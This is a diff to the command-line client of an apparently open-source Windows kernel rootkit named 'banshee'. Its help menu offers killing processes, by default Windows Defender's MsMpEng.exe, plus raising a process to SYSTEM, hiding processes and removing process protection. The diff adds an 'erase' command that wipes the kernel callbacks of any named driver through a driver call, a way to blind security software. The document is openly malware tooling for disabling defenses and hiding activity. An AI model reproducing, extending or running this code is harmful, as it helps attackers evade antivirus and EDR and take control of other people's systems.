@@ -62,17 +62,22 @@ main(INT argc, CHAR *argv[])
 
         if (choice == "help")
         {
-            printf("\nAvailable commands:\n");
+            printf("Kill:\n");
             printf("    kill      - kill process by PID\n");
             printf("    bury      - Create callback to kill process when it comes back up. Defaults to MsMpEng.exe\n");
+            printf("Process:\n");
             printf("    elevate   - Change a process access token to SYSTEM by PID\n");
             printf("    hide      - Hide a process from task manager etc. by PID\n");
             printf("    unprotect - remove protection from process by PID\n");
             printf("    protect   - apply PS_PROTECTED_SYSTEM protection to process by PID\n");
+            printf("Callbacks:\n");
             printf("    callbacks - enumerate kernel callbacks\n");
+            printf("    erase     - erase kernel callbacks of any driver\n");
+            printf("Driver:\n");
             printf("    test      - test driver\n");
             printf("    load      - load driver from path\n");
             printf("    unload    - unload driver\n");
+            printf("\n");
             printf("    exit      - exit banshee\n");
             continue;
         }
@@ -169,6 +174,17 @@ main(INT argc, CHAR *argv[])
                     printf(":: 0x%llx+0x%llx (%ws)\n", e.driverBase, e.offset, e.driverName);
                 }
             }
+        }
+        else if (choice == "erase")
+        {
+            auto targetDriver = AskInputNoPrompt("Target driver module (as printed in callback enumeration): ");
+
+            // strip spaces
+            auto end_pos = std::remove(targetDriver.begin(), targetDriver.end(), ' ');
+            targetDriver.erase(end_pos, targetDriver.end());
+
+            LogInfo("Attempting to erase callbacks of " + targetDriver);
+            status = banshee.IoCtlEraseCallbacks(targetDriver);
         }
         else
         {
